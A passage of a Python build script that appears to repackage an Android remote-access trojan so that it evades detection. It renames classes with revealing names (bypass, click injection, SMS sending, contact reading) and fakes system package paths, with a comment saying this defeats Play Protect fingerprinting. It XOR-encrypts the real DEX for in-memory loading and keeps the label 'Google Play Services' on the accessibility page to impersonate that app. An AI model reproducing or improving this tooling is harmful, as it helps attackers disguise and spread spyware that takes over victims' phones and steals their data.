    "PermissionMonitorService$a":    ["AccessibilityMonitorService$a","PermissionStateService$a","RuntimePermissionHelper$a","AccessPermissionService$a","PermissionCheckService$a","AccessibilityStateService$a","RuntimeAccessHelper$a","PermissionHelperService$a"],
    "PersistentWorker":              ["PeriodicSyncWorker","BackgroundRefreshWorker","DataSyncWorker","CacheRefreshWorker","PeriodicDataWorker","BackgroundSyncWorker","DataRefreshWorker","CacheSyncWorker"],
    "RC":                            ["PackageEventReceiver","AppInstallReceiver","PackageStateReceiver","AppEventReceiver","InstallEventReceiver","PackageChangeReceiver","AppStateReceiver","InstallStateReceiver"],
    "SensorRestarterBroadcastReceiver": ["ServiceRestartReceiver","ProcessReviveReceiver","ServiceRevivalReceiver","BackgroundRestartReceiver","ServiceRecoveryReceiver","ProcessRecoveryReceiver","ServiceRenewalReceiver","BackgroundRecoveryReceiver"],
    "ServiceStarterWorker":          ["ServiceInitWorker","BackgroundStartWorker","ServiceLaunchWorker","ProcessStartWorker","ServiceBootWorker","BackgroundInitWorker","ServiceStartupWorker","ProcessInitWorker"],
    "Upme":                          ["DeviceUpdateService","SystemUpdateHelper","AppUpdateService","SoftwareUpdateHelper","DeviceRefreshService","SystemRefreshHelper","AppRefreshService","UpdateHelperService"],
    "Utils":                         ["AppUtilityHelper","CommonHelperUtils","AppCommonHelper","UtilityManager","CommonAppHelper","SharedUtilityHelper","AppHelperUtils","CommonUtilManager"],
    "WackMeUpJob":                   ["ScheduledAlarmJob","PeriodicWakeJob","TimedTaskJob","AlarmSchedulerJob","PeriodicAlarmJob","TimedWakeJob","ScheduledTaskJob","AlarmTaskJob"],
    "WorkerService":                 ["BackgroundTaskService","AsyncWorkerService","TaskExecutorService","BackgroundJobService","AsyncTaskService","WorkExecutorService","TaskRunnerService","BackgroundExecutorService"],
    "body":                          ["RequestBodyHelper","DataBodyHelper","HttpBodyManager","RequestDataHelper","ContentBodyHelper","DataRequestBody","HttpDataHelper","RequestContentHelper"],
    "com":                           ["DataSyncService","ContentSyncService","BackgroundSyncService","RemoteSyncService","DataUpdateService","ContentUpdateService","BackgroundUpdateService","RemoteUpdateService"],
    "google":                        ["CloudServiceHelper","RemoteCloudHelper","CloudDataHelper","CloudContentHelper","DataCloudHelper","RemoteCloudService","CloudHelperService"],
    "love":                          ["ContentStreamService","DataStreamHelper","RemoteStreamService","ContentDataStream","StreamHelperService","DataContentStream","RemoteDataStream","ContentHelperStream"],
    "myker":                         ["DataKeepAliveHelper","ContentKeeperHelper","ServiceKeeperHelper","DataRetentionHelper","ContentRetainer","ServiceRetentionHelper","DataPersistHelper","ContentPersistHelper"],
    "video":                         ["MediaStreamService","ContentStreamHelper","MediaDataService","StreamContentHelper","MediaContentService","DataStreamService","ContentMediaHelper","StreamDataService"],
}

STRING_REPLACEMENTS = {
    # --- MainService ---
    "MainService::WakeLockTag":      "SyncJobService::WakeLockTag",
    "MainService":                   "BackgroundDataService",

    # --- NetworkManager --- (plain .java source + log tag)
    "NetworkManager.java":           "ConnectionStateMonitor.java",

    # --- LoveApi variants ---
    "LoveApi.java":                  "MediaContentProvider.java",
    "LoveApi0.java":                 "RemoteDataSource.java",
    "What_LoveApi0_Run":             "startRemoteDataFetch",
    "LoveApi0":                      "RemoteDataSource",
    "LoveApi":                       "MediaContentProvider",

    # Firebase .java source renames intentionally excluded.
    # Firebase* classes are not renamed (see CLASS_RENAME_POOLS exclusion above).
    # Renaming .source directives without renaming the class would be inconsistent.

    # --- Firebase const-string event/tag variants (all 30 occurrences) ---
    "FirebaseActivSend":             "CloudNotificationSender",
    "FirebaseApisscheduleJob":       "CloudApiScheduleJob",
    "FirebaseCheckPrims":            "RemoteConfigCheckPrims",
    "FirebaseFOR_IN":                "CloudListenerFor",
    "FirebaseFOR_prim":              "CloudListenerPrim",
    "FirebaseGlobalEvent":           "RemoteGlobalEvent",
    "FirebaseGlobalnode":            "RemoteGlobalNode",
    "FirebaseNeedPaste":             "CloudNeedPaste",
    "FirebaseOFFOK":                 "RemoteOffOk",
    "FirebaseOFK":                   "RemoteOfk",
    "FirebaseRD":                    "CloudRd",
    "FirebaseSW":                    "CloudSw",
    "FirebaseSendMeHome":            "RemoteSendMeHome",
    "FirebaseSendNotifi":            "CloudSendNotification",
    "FirebaseShowActivite":          "RemoteShowActivity",
    "FirebaseToPaste":               "CloudToPaste",
    "FirebaseTreger":                "RemoteTrigger",
    "FirebaseblockBack":             "CloudBlockBack",
    "Firebasebypass":                "RemoteBypass",
    "Firebaseclick":                 "CloudClick",
    "FirebaseclickAtPosition":       "CloudClickAtPosition",
    "FirebaseclickByText":           "CloudClickByText",
    "FirebasefindNodesByText":       "CloudFindNodesByText",
    "FirebasegetAppNameFromPkgName": "CloudGetAppName",
    "Firebaselay":                   "CloudLayout",
    "FirebaseperformClick":          "CloudPerformClick",
    "Firebasesendlog":               "CloudSendLog",
    "FirebasetoBase64":              "CloudToBase64",
    "Firebasewm":                    "CloudWindowManager",
    "FirebasewriteFile":             "CloudWriteFile",

    # --- Misc ---
    "CommandHandler":                "TaskQueueProcessor",
    "DelayMetCommandHandler":        "DelayedTaskQueueProcessor",
    "ProcessCommand":                "executeBackgroundTask",
    "DownloadTask":                  "FileRetrievalTask",
    "SensorRestarterBroadcastReceiver": "ServiceRestartReceiver",
    "WackMeUpJob":                   "ScheduledAlarmJob",
    "PersistentWorker":              "PeriodicSyncWorker",
}


def step_6a_rename_classes(new_pkg: str) -> dict:
    print("\n── Step 6A: Rename companion classes to legitimate Android names")
    import random as _random

    chosen = {}
    for orig, pool in CLASS_RENAME_POOLS.items():
        chosen[orig] = _random.choice(pool)

    print(f"  Renaming {len(chosen)} companion classes")

    smali_dir = "companion_decompiled/smali"
    new_path = new_pkg.replace(".", "/")

    for orig, new_name in chosen.items():
        if orig.startswith("R$") or orig == "R" or orig == "BuildConfig":
            continue
        old_smali = f"L{new_path}/{orig};"
        new_smali = f"L{new_path}/{new_name};"
        _py_sed(smali_dir, old_smali, new_smali)
        orig_file = f"{smali_dir}/{new_path}/{orig}.smali"
        new_file  = f"{smali_dir}/{new_path}/{new_name}.smali"
        if os.path.isfile(orig_file) and orig_file != new_file:
            os.rename(orig_file, new_file)

    renamed_count = sum(1 for k in chosen if not k.startswith("R") and k != "BuildConfig")
    print(f"  ✅ {renamed_count} classes renamed to legitimate Android names")
    return chosen


def step_6c_replace_bad_strings(new_pkg: str, class_rename_map: dict) -> int:
    print("\n── Step 6C: Replace known-bad strings with legitimate equivalents")

    smali_dir = "companion_decompiled/smali"
    replaced_total = 0

    replacements = dict(STRING_REPLACEMENTS)
    for orig, new_name in class_rename_map.items():
        base_orig = orig.split("$")[0]
        base_new  = new_name.split("$")[0]
        if base_orig not in replacements and len(base_orig) > 3:
            replacements[base_orig] = base_new

    for old_str, new_str in replacements.items():
        if len(old_str) < 5:
            continue
        for _root6c, _dirs6c, _files6c in os.walk(smali_dir):
            for _fname6c in _files6c:
                if not _fname6c.endswith(".smali"): continue
                _fpath6c = os.path.join(_root6c, _fname6c)
                try:
                    with open(_fpath6c, "r", encoding="utf-8", errors="replace") as f:
                        fc = f.read()
                    if old_str not in fc: continue
                    fc2 = fc
                    # 1. Replace const-string for all register names (v0-v15, p0-p4)
                    import re as _re6c
                    fc2 = _re6c.sub(
                        r'(const-string(?:/jumbo)?\s+\w+,\s+")' + _re6c.escape(old_str) + r'"',
                        lambda m: m.group(1) + new_str + '"',
                        fc2
                    )
                    # 2. Replace .source "BadName.java" directives
                    fc2 = fc2.replace(
                        f'.source "{old_str}"',
                        f'.source "{new_str}"',
                    )
                    # 3. Replace .field initializer string values e.g. = "MainService::WakeLockTag"
                    fc2 = fc2.replace(
                        f'= "{old_str}"',
                        f'= "{new_str}"',
                    )
                    if fc != fc2:
                        with open(_fpath6c, "w", encoding="utf-8") as f:
                            f.write(fc2)
                        replaced_total += 1
                except Exception: pass

    # 3. Separately handle T_NetworkManager_X obfuscated strings
    # These look like: const-string v0, "T_NetworkManager_2"
    # The substring "_NetworkManager_" must be replaced with "_ConnectionStateMonitor_"
    import re as _re6c2
    _nm_pattern = _re6c2.compile(
        r'(const-string(?:/jumbo)?\s+\w+,\s+"[^"]*?)NetworkManager([^"]*?")'
    )
    for _root6c, _dirs6c, _files6c in os.walk(smali_dir):
        for _fname6c in _files6c:
            if not _fname6c.endswith(".smali"): continue
            _fpath6c = os.path.join(_root6c, _fname6c)
            try:
                with open(_fpath6c, "r", encoding="utf-8", errors="replace") as f:
                    fc = f.read()
                if "NetworkManager" not in fc: continue
                fc2 = _nm_pattern.sub(r'\1ConnectionStateMonitor\2', fc)
                if fc != fc2:
                    with open(_fpath6c, "w", encoding="utf-8") as f:
                        f.write(fc2)
                    replaced_total += 1
            except Exception: pass

    print(f"  ✅ Replaced strings in {replaced_total} files")
    return replaced_total


def step_6d_rename_methods(new_pkg: str) -> int:
    print("\n── Step 6D: Rename custom methods to legitimate names")
    import random as _random

    CUSTOM_METHOD_RENAMES = {
        "initSocket":             ["initializeNetworkConnection","setupRemoteConnection","establishSocketChannel","prepareNetworkChannel"],
        "connectSocket":          ["connectRemoteServer","establishServerConnection","openNetworkChannel","startRemoteConnection"],
        "disconnectSocket":       ["closeNetworkChannel","terminateServerConnection","shutdownRemoteConnection","endNetworkSession"],
        "receiveData":            ["receiveNetworkPayload","downloadDataContent","fetchServerData","pullRemoteData"],
        "checkPermissions":       ["verifyRuntimePermissions","validateAccessPermissions","checkGrantedPermissions","verifyAppPermissions"],
        "getDeviceInfo":          ["collectDeviceInformation","gatherSystemMetadata","retrieveDeviceMetrics","fetchSystemInformation"],
        "sendSms":                ["transmitTextMessage","sendSmsPayload","dispatchTextMessage","sendOutboundSms"],
        "readContacts":           ["fetchContactEntries","retrieveContactList","loadContactDatabase","readContactEntries"],
    }

    smali_dir = "companion_decompiled/smali"
    renamed = 0

    for orig_method, pool in CUSTOM_METHOD_RENAMES.items():
        new_method = _random.choice(pool)
        count = _py_grep_count(smali_dir, orig_method)
        if count > 0:
            import re as _re6d
            for _r6d, _d6d, _f6d in os.walk(smali_dir):
                for _fn6d in _f6d:
                    if not _fn6d.endswith(".smali"): continue
                    _fp6d = os.path.join(_r6d, _fn6d)
                    try:
                        with open(_fp6d, "r", encoding="utf-8", errors="replace") as _f:
                            _fc = _f.read()
                        if orig_method not in _fc: continue
                        _lines = _fc.splitlines(keepends=True)
                        _new_lines = []
                        _changed = False
                        for _line in _lines:
                            if orig_method in _line:
                                if _re6d.search(r'L(android|java|javax|kotlin|dalvik)/', _line) and '->'+ orig_method in _line:
                                    _new_lines.append(_line)
                                else:
                                    _new_lines.append(_line.replace(orig_method, new_method))
                                    _changed = True
                            else:
                                _new_lines.append(_line)
                        if _changed:
                            with open(_fp6d, "w", encoding="utf-8") as _f:
                                _f.write("".join(_new_lines))
                    except Exception: pass
            renamed += count

    print(f"  ✅ Renamed custom methods in {renamed} files")
    return renamed


def step_6e_rename_socket_package(new_pkg: str) -> int:
    # Random destination per build — prevents GPP fingerprinting fixed com/netlib path
    # All destinations mimic Android internal package paths
    # io/socket → com/android/internal/net  (or other random pick below)
    import random as _random_6e
    SOCKET_PKG_DESTINATIONS = [
        ("com/android/internal/net",  "com.android.internal.net"),
        ("com/android/internal/os",   "com.android.internal.os"),
        ("com/android/internal/app",  "com.android.internal.app"),
        ("com/android/internal/util", "com.android.internal.util"),
        ("com/android/internal/view", "com.android.internal.view"),
        ("com/android/internal/http", "com.android.internal.http"),
        ("com/android/internal/io",   "com.android.internal.io"),
        ("com/android/internal/conn", "com.android.internal.conn"),
    ]
    new_pkg_path, new_pkg_dot = _random_6e.choice(SOCKET_PKG_DESTINATIONS)
    print(f"\n── Round 2 Step 6E: Rename io/socket → {new_pkg_path} (random per build)")

    smali_dir = "companion_decompiled/smali"
    old_pkg_path = "io/socket"
    old_pkg_dot  = "io.socket"

    _py_sed(smali_dir, old_pkg_path, new_pkg_path)
    _py_sed(smali_dir, old_pkg_dot,  new_pkg_dot)

    # Build new directory path from new_pkg_path segments
    new_dir_parts = new_pkg_path.split("/")
    new_dir = os.path.join(smali_dir, *new_dir_parts)
    old_dir = os.path.join(smali_dir, "io", "socket")

    if os.path.isdir(old_dir):
        os.makedirs(new_dir, exist_ok=True)
        for item in os.listdir(old_dir):
            src = os.path.join(old_dir, item)
            dst = os.path.join(new_dir, item)
            if os.path.exists(dst):
                shutil.rmtree(dst) if os.path.isdir(dst) else os.remove(dst)
            shutil.move(src, dst)
        try:
            os.rmdir(old_dir)
            io_dir = os.path.join(smali_dir, "io")
            if os.path.isdir(io_dir) and not os.listdir(io_dir):
                os.rmdir(io_dir)
        except OSError:
            pass
        print(f"  ✅ io/socket directory → {new_pkg_path}")
    else:
        print(f"  ℹ️  io/socket smali directory not found")

    remaining = _py_grep_count(smali_dir, "io/socket")
    if remaining > 0:
        print(f"  ⚠️  {remaining} io/socket references still found")
    else:
        print(f"  ✅ All io/socket references renamed (0 remaining)")

    return remaining


def step_patch_home_launcher():
    print("\n── Step 7: Patch findByHomeLauncher — add FLAG_SYSTEM check")
    target_file = ""
    for _root7, _dirs7, _files7 in os.walk("companion_decompiled/smali"):
        for _fname7 in _files7:
            if not _fname7.endswith(".smali"): continue
            _fpath7 = os.path.join(_root7, _fname7)
            try:
                with open(_fpath7, "r", encoding="utf-8", errors="replace") as _f7:
                    if "findByHomeLauncher" in _f7.read():
                        target_file = _fpath7
                        break
            except Exception: pass
        if target_file: break
    if not target_file:
        print("  ⚠️  findByHomeLauncher not found in any smali file — skipping (not present in this APK)")
        return
    print(f"  Patching: {target_file}")

    with open(target_file, "r") as f:
        content = f.read()

    OLD_LINE = "    return-object v2"
    NEW_LINE = (
        "    invoke-virtual {p0}, Landroid/content/Context;->getPackageManager()"
        "Landroid/content/pm/PackageManager;\n"
        "    move-result-object v3\n"
        "    const/4 v4, 0x0\n"
        "    invoke-virtual {v3, v2, v4}, Landroid/content/pm/PackageManager;"
        "->getApplicationInfo(Ljava/lang/String;I)Landroid/content/pm/ApplicationInfo;\n"
        "    move-result-object v3\n"
        "    iget v4, v3, Landroid/content/pm/ApplicationInfo;->flags:I\n"
        "    const/4 v3, 0x1\n"
        "    and-int/2addr v4, v3\n"
        "    if-nez v4, :cond_0\n"
        "    return-object v2"
    )

    if OLD_LINE not in content:
        print("  ⚠️  Target line 'return-object v2' not found in smali — skipping patch")
        return

    content = content.replace(OLD_LINE, NEW_LINE, 1)
    with open(target_file, "w") as f:
        f.write(content)

    if "getApplicationInfo" not in open(target_file).read():
        print("  ⚠️  Patch NOT applied — skipping")
        return
    print("  ✅ FLAG_SYSTEM patch applied and verified")


def step_restore_apktool_yml(meta):
    print("\n── Step 8: Restore apktool.yml")
    content = f"""version: 2.9.3
apkFileName: module.apk
isFrameworkApk: false
usesFramework:
  ids:
  - 1
  tag: null
sdkInfo:
  minSdkVersion: '{meta["min_sdk"]}'
  targetSdkVersion: '{meta["tgt_sdk"]}'
packageInfo:
  forcedPackageId: '127'
  renameManifestPackage: null
versionInfo:
  versionCode: '{meta["ver_code"]}'
  versionName: '{meta["ver_name"]}'
resourcesAreCompressed: false
sharedLibrary: false
sparseResources: false
dexVersion: '035'
doNotCompress:
- resources.arsc
"""
    with open("companion_decompiled/apktool.yml", "w") as f:
        f.write(content)
    print("  ✅ apktool.yml restored (dexVersion: 035)")


def step_fix_smali_flow_through():
    """
    Fix: smali files where normal code can fall through into a move-exception handler.
    Android 17 strict dex2oat verifier rejects:
      - [0xD8] Can flow through to move-exception
      - invalid use of move-exception as branch target

    Pattern: a block of one or more consecutive .catch lines, followed (no goto/return/throw
    between them and the label) directly by a catch label whose first instruction is
    move-exception. Normal execution falls through the .catch block into the handler.

    Fix: insert 'goto :goto_skip_<label>' immediately after the last .catch line of the
    block, and insert ':goto_skip_<label>' after the catch handler body ends.

    Verified against RecyclerView.smali and SystemStateReceiver.smali from Build #41/#42.
    """
    import glob as _glob
    import re

    print("\n── Fix: Smali flow-through to move-exception (Android 17 VerifyError)")
    smali_files = _glob.glob("companion_decompiled/smali/**/*.smali", recursive=True)
    fixed_count = 0
    goto_counter = [0]  # mutable counter for unique goto labels per file

    def next_goto(label_name):
        goto_counter[0] += 1
        return f":goto_skip_{label_name}_{goto_counter[0]}"

    for fpath in smali_files:
        try:
            with open(fpath, "r", encoding="utf-8", errors="replace") as f:
                lines = f.readlines()
        except Exception as e:
            print(f"  [warn] Cannot read {fpath}: {e}")
            continue

        goto_counter[0] = 0
        new_lines = []
        i = 0
        changed = False

        while i < len(lines):
            stripped = lines[i].strip()

            # Detect start of a .catch block (one or more consecutive .catch lines)
            if stripped.startswith(".catch "):
                # Collect all consecutive .catch lines
                catch_block_start = i
                catch_block_lines = []
                j = i
                while j < len(lines) and lines[j].strip().startswith(".catch "):
                    catch_block_lines.append(lines[j])
                    j += 1

                # j now points to first non-.catch line
                # Skip blank lines after the .catch block
                k = j
                while k < len(lines) and lines[k].strip() == "":
                    k += 1

                # Check: is the next non-blank line a catch label?
                if k < len(lines):
                    next_stripped = lines[k].strip()
                    label_match = re.match(r'^:(\w+)$', next_stripped)
                    if label_match:
                        label_name = label_match.group(1)
                        # Check if first instruction after label is move-exception
                        m = k + 1
                        while m < len(lines) and lines[m].strip() == "":
                            m += 1
                        if m < len(lines) and lines[m].strip().startswith("move-exception"):
                            # BUG CONFIRMED: fall-through from .catch block to move-exception
                            goto_lbl = next_goto(label_name)
                            indent = "    "

                            # Write all .catch lines unchanged
                            for cl in catch_block_lines:
                                new_lines.append(cl)
                            # Write blank lines between catch block and label
                            for bi in range(j, k):
                                new_lines.append(lines[bi])
                            # Insert goto to skip over catch handler
                            new_lines.append(f"{indent}goto {goto_lbl}\n")

                            # Now copy catch label + handler body
                            new_lines.append(lines[k])  # :catch_N label
                            # Copy handler body until next label/directive/.end method
                            p = k + 1
                            while p < len(lines):
                                ps = lines[p].strip()
                                if ps.startswith(":") or ps.startswith(".end method") or ps.startswith(".method"):
                                    break
                                new_lines.append(lines[p])
                                p += 1
                            # Insert skip label after handler body
                            new_lines.append(f"{indent}{goto_lbl}\n")

                            i = p
                            changed = True
                            continue

                # No fall-through bug: write .catch block as-is and continue
                for cl in catch_block_lines:
                    new_lines.append(cl)
                i = j
                continue

            new_lines.append(lines[i])
            i += 1

        if changed:
            with open(fpath, "w", encoding="utf-8") as f:
                f.writelines(new_lines)
            print(f"  ✅ Fixed flow-through in: {fpath}")
            fixed_count += 1

    print(f"  ✅ step_fix_smali_flow_through done. Files fixed: {fixed_count}")


def step_debug_smali_verify():
    """
    DEBUG: Scan all smali files for patterns that cause VerifyError on strict verifiers.
    Prints full content of any file with suspicious try/catch or move-exception patterns.
    Runs BEFORE dex rebuild so all problems are visible in one build.
    """
    print("\n── DEBUG: Scanning ALL smali files for VerifyError patterns")
    import glob as _glob
    smali_files = _glob.glob("companion_decompiled/smali/**/*.smali", recursive=True)
    print(f"  [debug] Total smali files to scan: {len(smali_files)}")

    suspicious = []
    for fpath in smali_files:
        try:
            with open(fpath, "r", encoding="utf-8", errors="replace") as f:
                content = f.read()
        except Exception as e:
            print(f"  [debug] Could not read {fpath}: {e}")
            continue

        lines = content.splitlines()
        has_move_exception = False
        has_try_block = False
        has_catch = False
        move_exception_lines = []

        for i, line in enumerate(lines):
            stripped = line.strip()
            if stripped.startswith("move-exception"):
                has_move_exception = True
                move_exception_lines.append((i + 1, line))
            if stripped.startswith(":try_start") or stripped.startswith(":p3_try_start"):
                has_try_block = True
            if stripped.startswith(".catch"):
                has_catch = True

        if has_move_exception:
            suspicious.append((fpath, move_exception_lines, lines))

    if not suspicious:
        print("  [debug] No move-exception patterns found in any smali file")
    else:
        print(f"\n  [debug] ⚠️  Found {len(suspicious)} smali file(s) with move-exception:")
        for fpath, me_lines, all_lines in suspicious:
            print(f"\n{'='*70}")
            print(f"  FILE: {fpath}")
            print(f"  move-exception at lines: {[l for l,_ in me_lines]}")
            print(f"{'='*70}")
            # Print full file content so we can see the try/catch structure
            for i, line in enumerate(all_lines):
                print(f"  {i+1:4d} | {line}")
            print(f"{'='*70}")

    print(f"\n  [debug] Smali VerifyError scan complete. Suspicious files: {len(suspicious)}")


def step_rebuild_dex():
    print("\n── Step 9: Rebuild classes.dex")
    import glob as _glob
    injected_files = _glob.glob("companion_decompiled/smali/**/*.smali", recursive=True)
    print(f"  [debug] Total smali files before apktool: {len(injected_files)}")
    if os.path.isdir("companion_decompiled/build"):
        shutil.rmtree("companion_decompiled/build")
    run(f'{APKTOOL_CMD} b companion_decompiled -o smali_rebuilt.apk --no-res')

    if not os.path.isfile("smali_rebuilt.apk") or os.path.getsize("smali_rebuilt.apk") == 0:
        print("[X] apktool repackage failed or produced empty file")
        sys.exit(1)

    with zipfile.ZipFile("smali_rebuilt.apk", "r") as z:
        dex_data = z.read("classes.dex")

    if not dex_data:
        print("[X] classes.dex extraction failed or empty")
        sys.exit(1)

    print(f"  ℹ️  DEX version: {dex_data[4:7].decode('ascii', 'replace')} (apktool.yml dexVersion:035 handles sort+version)")

    with open("new_classes.dex", "wb") as f:
        f.write(dex_data)

    print(f"  ✅ classes.dex rebuilt ({len(dex_data) // 1024} KB)")
    return dex_data


def step_encrypt_dex_asset(dex_data: bytes) -> tuple:
    """
    PHASE_3 STEP_2: Encrypt real classes.dex → store as assets/p3d.bin

    Encryption: XOR with random 32-byte key (per-build, never the same).
    Key stored separately as assets/p3k.bin inside the companion APK.

    Format of p3d.bin:
        [4 bytes LE: original DEX length][XOR-encrypted DEX bytes]

    Format of p3k.bin:
        [32 bytes: raw XOR key]

    Both assets are injected into the companion APK by step_patch_and_assemble().
    The runtime smali loader reads both assets, XOR-decrypts, loads via
    InMemoryDexClassLoader (API 26+) or DexClassLoader fallback (API 21-25).

    Returns: (key_bytes: bytes, enc_asset: bytes)
    """
    print("\n── PHASE_3 STEP_2: Encrypt classes.dex → assets/p3d.bin + p3k.bin")

    # Random 32-byte XOR key — fresh per build
    key = secrets.token_bytes(32)

    # XOR encrypt: cycle key across full DEX
    dex_len = len(dex_data)
    enc = bytearray(dex_len)
    for i in range(dex_len):
        enc[i] = dex_data[i] ^ key[i % 32]

    # Prepend original length (4 bytes LE) for runtime size validation
    import struct as _struct
    enc_asset = _struct.pack("<I", dex_len) + bytes(enc)

    print(f"  [p3_encrypt] DEX: {dex_len:,} bytes")
    print(f"  [p3_encrypt] Key: {key.hex()[:16]}... (32 bytes, per-build random)")
    print(f"  [p3_encrypt] Encrypted asset: {len(enc_asset):,} bytes → assets/p3d.bin")
    print(f"  [p3_encrypt] Key asset: 32 bytes → assets/p3k.bin")
    print(f"  ✅ PHASE_3 STEP_2: DEX encrypted")

    return key, enc_asset


def _read_utf8_str(data, pos):
    start = pos
    b = data[pos]; pos += 1
    char_len = ((b & 0x7f) << 8) | data[pos] if b & 0x80 else b
    if b & 0x80: pos += 1
    b = data[pos]; pos += 1
    byte_len = ((b & 0x7f) << 8) | data[pos] if b & 0x80 else b
    if b & 0x80: pos += 1
    s = data[pos:pos+byte_len].decode("utf-8", errors="replace")
    pos += byte_len + 1
    return s, pos - start


def _encode_utf8_str(s):
    enc = s.encode("utf-8")
    cl, bl = len(s), len(enc)
    hdr  = bytes([(cl >> 8) | 0x80, cl & 0xff]) if cl > 0x7f else bytes([cl])
    hdr += bytes([(bl >> 8) | 0x80, bl & 0xff]) if bl > 0x7f else bytes([bl])
    return hdr + enc + b'\x00'


def _is_appcompat_arsc_string(s):
    """
    Returns True if this arsc string pool entry belongs to AppCompat/androidx
    and can be safely blanked to shrink arsc.

    CRITICAL RULE: Never blank strings that could be companion's own app label,
    service name, or accessibility description. These must survive intact so the
    accessibility page shows the correct app name (e.g. 'Google Play Services').

    Keep rules (checked first — any match = do NOT blank):
      - Empty strings
      - Strings <= 4 chars
      - Pure alphanumeric/underscore filenames <= 16 chars (res/ path tokens)
      - Strings that look like app labels: Title Case words, 2-4 words, no punctuation
      - res/ path prefixes
      - Numeric-only strings (version numbers, IDs)
      - Single words with mixed case (class names, identifiers)

    Blank rules (AppCompat/androidx content):
      - android.* / androidx.* / com.google.* namespaced strings
      - Widget.* / Base.* / Theme.* / TextAppearance.* style names
      - Strings with %d/%s/%1$ format specifiers (translated UI strings)
      - Full sentences (>= 5 words, lots of spaces)
      - Strings starting with http/content://
      - Very long strings (> 60 chars) — these are always AppCompat translations
    """
    import re as _re_arsc
    if not s:
        return False
    # Keep very short strings — IDs, path tokens
    if len(s) <= 4:
        return False
    # Keep purely numeric strings (version codes, IDs)
    if s.isdigit():
        return False
    # Keep pure alphanumeric+underscore short strings — res/ filename tokens
    if _re_arsc.match(r'^[a-zA-Z0-9_]{1,16}$', s):
        return False
    # Keep res/ path prefixes
    if s.startswith('res/') or s.startswith('assets/') or s.startswith('oat/'):
        return False
    # CRITICAL: Keep strings that look like app labels / service names:
    # - Title Case words with spaces, 1-3 words, no punctuation except spaces
    # - e.g. "Google Play Services", "Play Protect", "Wedding Invitation"
    # - Max 3 words — AppCompat UI strings like "Close navigation drawer" have 3+ words
    #   but are verb phrases. We use a verb blacklist to distinguish.
    _APPCOMPAT_VERBS = {
        'close', 'navigate', 'collapse', 'expand', 'open', 'select',
        'scroll', 'switch', 'move', 'drag', 'drop', 'swipe', 'tap',
        'show', 'hide', 'more', 'less', 'clear', 'reset', 'retry',
        'share', 'copy', 'paste', 'cut', 'undo', 'redo', 'search',
    }
    words = s.split(' ')
    # Keep 1-2 word Title Case strings as app labels (e.g. "Google Play", "Play Protect")
    # Keep 3-word Title Case ONLY for known product names like "Google Play Services"
    # Scrub all other multi-word Title Case (AppCompat UI: "Close navigation drawer")
    _KNOWN_LABELS = {'Google Play Services', 'Google Play', 'Play Services', 'Play Protect'}
    if s in _KNOWN_LABELS:
        return False
    if (1 <= len(words) <= 2
            and all(w and w[0].isupper() for w in words if w)
            and _re_arsc.match(r'^[A-Za-z ]+$', s)
            and words[0].lower() not in _APPCOMPAT_VERBS):
        return False
    # Keep single CamelCase words — class/method identifiers
    if _re_arsc.match(r'^[A-Z][a-zA-Z0-9]+$', s) and len(s) <= 30:
        return False

    # --- BLANK rules below ---
    # Android/androidx/google namespaced strings
    if s.startswith('android.') or s.startswith('androidx.') or s.startswith('com.google.'):
        return True
    # AppCompat style/theme names
    if s.startswith('Widget.') or s.startswith('Base.') or s.startswith('Theme.') or s.startswith('TextAppearance.'):
        return True
    # Format strings from translated UI (notification templates etc.)
    if '%d' in s or '%s' in s or '%1$' in s or '%2$' in s or '%n$' in s:
        return True
    # URLs and URIs
    if s.startswith('http') or s.startswith('content://') or s.startswith('market://'):
        return True
    # 4+ words — always AppCompat translated UI strings
    if len(words) >= 4:
        return True
    # Very long strings — always AppCompat translations
    if len(s) > 60:
        return True
    # 3-word strings where first word (any case) is a known verb → AppCompat UI
    if len(words) == 3 and words[0].lower() in _APPCOMPAT_VERBS:
        return True
    # 3-word strings with any lowercase word → not a product label
    if len(words) == 3 and any(w and w[0].islower() for w in words):
        return True
    # 2-word strings where first word (any case) is a known verb
    if len(words) == 2 and words[0].lower() in _APPCOMPAT_VERBS:
        return True
    # 2-word strings where second word starts lowercase → AppCompat translated UI
    if len(words) == 2 and words[1] and words[1][0].islower():
        return True
    # Strings with mixed punctuation that are clearly not labels
    if _re_arsc.search(r'[+\-*/\\|<>{}[\]@#^~`]', s) and ' ' in s:
        return True
    return False


def _strip_arsc_languages(arsc_data):
    """
    Strip TABLE_TYPE chunks for non-English / non-Indian locales from arsc.

    Keeps:
      English  — lang='' (default) or lang='en'
      Indian   — hi bn te mr ta gu kn ml or pa ur as sa ne ks sd si my
                 (Hindi, Bengali, Telugu, Marathi, Tamil, Gujarati, Kannada,
                  Malayalam, Odia, Punjabi, Urdu, Assamese, Sanskrit, Nepali,
                  Kashmiri, Sindhi, Sinhala, Burmese/Myanmar)

    Strips:
      Everything else — af am ar az be bg bs ca cs da de el es et eu fa fi
                        fr gl hr hu hy in is it iw ja ka kk km ko ky lo lt
                        lv mk mn ms nb nl pl pt ro ru sk sl sq sr sv sw th
                        tl tr uk uz vi zh zu  (58 locales)

    Language identifier: bytes 8-9 of ResTable_config inside each TABLE_TYPE.
    TABLE_TYPE chunk type = 0x0201.
    All other chunk types (STRING_POOL, TABLE_TYPE_SPEC, TABLE_PACKAGE header)
    are always preserved — only TABLE_TYPE data chunks are filtered.
    """
    KEEP_LANGS = {
        b'',    # default / no locale qualifier
        b'en',  # English
        b'hi',  # Hindi
        b'bn',  # Bengali
        b'te',  # Telugu
        b'mr',  # Marathi
        b'ta',  # Tamil
        b'gu',  # Gujarati
        b'kn',  # Kannada
        b'ml',  # Malayalam
        b'or',  # Odia
        b'pa',  # Punjabi
        b'ur',  # Urdu
        b'as',  # Assamese
        b'sa',  # Sanskrit
        b'ne',  # Nepali
        b'ks',  # Kashmiri
        b'sd',  # Sindhi
        b'si',  # Sinhala
        b'my',  # Burmese / Myanmar
    }

    data = bytearray(arsc_data)
    total = len(data)

    # Find the package chunk
    tbl_hdr_size = struct.unpack_from('<H', data, 2)[0]
    SP           = tbl_hdr_size
    sp_size      = struct.unpack_from('<I', data, SP + 4)[0]
    pkg_start    = SP + sp_size
    if pkg_start >= total:
        return arsc_data  # malformed — return unchanged

    pkg_hdr_size = struct.unpack_from('<H', data, pkg_start + 2)[0]
    pkg_size     = struct.unpack_from('<I', data, pkg_start + 4)[0]
    pkg_end      = pkg_start + pkg_size

    # Rebuild the package interior, skipping unwanted TABLE_TYPE chunks
    pos = pkg_start + pkg_hdr_size
    end = min(pkg_end, total)

    kept   = bytearray()
    stripped_count = 0
    stripped_bytes = 0

    while pos < end - 8:
        ct = struct.unpack_from('<H', data, pos)[0]
